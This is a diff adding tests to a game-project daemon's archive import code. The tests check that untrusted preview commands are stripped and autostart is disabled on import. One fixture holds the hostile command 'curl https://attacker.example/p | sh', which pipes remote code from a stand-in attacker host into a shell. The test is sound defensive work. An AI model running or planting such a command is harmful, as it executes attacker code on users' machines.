@@ -21,6 +21,7 @@ import { createApp } from "../src/daemon/app.js";
 import { AssetLibrary } from "../src/daemon/asset-library.js";
 import { createNodeCodebase } from "../src/daemon/playable-codebase.js";
 import {
+  excludedFromProjectArchive,
   exportProjectArchive,
   importProjectArchive,
 } from "../src/daemon/project-archive.js";
@@ -981,6 +982,60 @@ describe("project archive import", () => {
     expect(
       (await app.inject({ method: "GET", url: "/projects" })).json(),
     ).toEqual([]);
+  });
+
+  it("strips untrusted preview commands and disables autostart on archive import", async () => {
+    const projects = new ProjectManager(await temporaryDirectory());
+    const malicious = {
+      version: 1,
+      name: "Imported",
+      kind: "web-game",
+      previewMode: "command",
+      previewCommand: "curl https://attacker.example/p | sh",
+      previewArguments: ["--evil"],
+      previewAutoStart: true,
+    };
+    const fromSettings = await importProjectArchive(
+      projects,
+      await zipArchive({
+        ".ohmygame/settings.json": JSON.stringify(malicious),
+        "index.html": "<p>ok</p>",
+      }),
+    );
+    expect(fromSettings.previewAutoStart).toBe(false);
+    expect(fromSettings.previewCommand).toBeUndefined();
+    expect(fromSettings.previewArguments).toBeUndefined();
+    expect(fromSettings.previewMode).toBeUndefined();
+    const disk = JSON.parse(await readFile(path.join(fromSettings.workspacePath, ".ohmygame", "settings.json"), "utf8")) as Record<string, unknown>;
+    expect(disk.previewAutoStart).toBe(false);
+    expect(disk.previewCommand).toBeUndefined();
+    expect(disk.previewArguments).toBeUndefined();
+    expect(disk.previewMode).toBeUndefined();
+
+    const fromLegacyManifest = await importProjectArchive(
+      projects,
+      await zipArchive({
+        "ohmygame-project.json": manifest({
+          name: "Legacy",
+          type: "web-game",
+          previewMode: "command",
+          previewCommand: "touch /tmp/pwn",
+          previewArguments: ["-x"],
+          previewAutoStart: true,
+        }),
+        "index.html": "<p>ok</p>",
+      }),
+    );
+    expect(fromLegacyManifest.previewAutoStart).toBe(false);
+    expect(fromLegacyManifest.previewCommand).toBeUndefined();
+    expect(fromLegacyManifest.previewMode).toBeUndefined();
+  });
+
+  it("excludes root build folders case-insensitively", () => {
+    expect(excludedFromProjectArchive("Dist/app.js")).toBe(true);
+    expect(excludedFromProjectArchive("BUILD/index.html")).toBe(true);
+    expect(excludedFromProjectArchive("Canvas/jobs.json")).toBe(true);
+    expect(excludedFromProjectArchive("src/Dist/app.js")).toBe(false);
   });
 });
 
